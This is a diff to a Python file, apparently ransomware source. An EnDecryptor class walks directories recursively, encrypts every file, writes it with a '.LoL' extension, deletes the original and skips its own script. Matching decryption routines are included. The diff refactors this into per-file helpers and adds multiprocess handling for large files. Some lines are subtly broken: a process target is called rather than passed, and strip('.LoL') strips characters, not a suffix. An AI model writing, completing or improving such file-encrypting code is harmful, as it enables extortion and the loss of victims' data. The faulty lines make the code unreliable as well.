@@ -123,18 +123,37 @@ class EnDecryptor:
         self._files=files
         self._encryptModule=encryptModule
 
+    def encEach(self, path):
+        with open(path, "rb") as File:
+            data=File.read()
+        encryptedFile=self._encryptModule.encrypt(data)
+        with open(f"{path}.LoL", "wb") as File:
+            File.write(encryptedFile)
+        os.remove(path)
+
+    def decEach(self, path):
+        originName=path.strip(".LoL")
+        with open(path, "rb") as File:
+            data=File.read()
+        decryptedFile=self._encryptModule.decrypt(data)
+        with open(originName, "wb") as File:
+            File.write(decryptedFile)
+        os.remove(path)
+
     def encryptFile(self):
         try:
             for file in self._files:
                 if(os.path.isfile(file)==True):
                     if(file==sys.argv[0]):
                         return
-                    with open(file, "rb") as File:
-                        data=File.read()
-                    encryptedFile=self._encryptModule.encrypt(data)
-                    with open(f"{file}.LoL", "wb") as File:
-                        File.write(encryptedFile)
-                    os.remove(file)
+                    if(os.path.getsize(file)>50000000):
+                        th=Process(target=self.encEach(file))
+                        ThreadPool.append(th)
+                        th.start()
+                        print('[DEBUG] start')
+                        
+                    else :
+                        self.encEach(file)
                 
         except Exception as e:
             print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")
@@ -145,14 +164,17 @@ class EnDecryptor:
                 if(os.path.isfile(file)==True):
                     if(file==sys.argv[0]):
                         return
-                    originName=file.strip(".LoL")
-                    with open(file, "rb") as File:
-                        data=File.read()
-                    decryptedFile=self._encryptModule.decrypt(data)
-                    with open(originName, "wb") as File:
-                        File.write(decryptedFile)
-                    os.remove(file)
+                    if(os.path.getsize(file)>50000000):
+                        th=Process(target=self.decEach(file))
+                        ThreadPool.append(th)
+                        th.start()
+                        print('[DEBUG] start')
+                        
+                    else :
+                        self.decEach(file)
 
+                    
+                
         except Exception as e:
             print(f"[DEBUG] Error on EnDecrypt.decryptFile(): {e}")
 
@@ -184,10 +206,10 @@ def recursiveEncrypt(basepath):
             dirs.append(absolutePath)
 
     if (len(files)>0):
-        th=Process(target=EnDecryptor(files, EncryptModule).encryptFile())
-        ThreadPool.append(th)
-        th.start()
-        #EnDecryptor(files, EncryptModule).encryptFile()
+        #th=Thread(target=EnDecryptor(files, EncryptModule).encryptFile())
+        #ThreadPool.append(th)
+        #th.start()
+        EnDecryptor(files, EncryptModule).encryptFile()
     for dir in dirs:
         recursiveEncrypt(dir)
 
@@ -202,10 +224,10 @@ def recursiveDecrypt(basepath):
             dirs.append(absolutePath)
 
     if (len(files)>0):
-        th=Process(target=EnDecryptor(files, EncryptModule).decryptFile())
-        ThreadPool.append(th)
-        th.start()
-        #EnDecryptor(files, EncryptModule).decryptFile()
+        #th=Thread(target=EnDecryptor(files, EncryptModule).decryptFile())
+        #ThreadPool.append(th)
+        #th.start()
+        EnDecryptor(files, EncryptModule).decryptFile()
     for dir in dirs:
         recursiveDecrypt(dir)
 
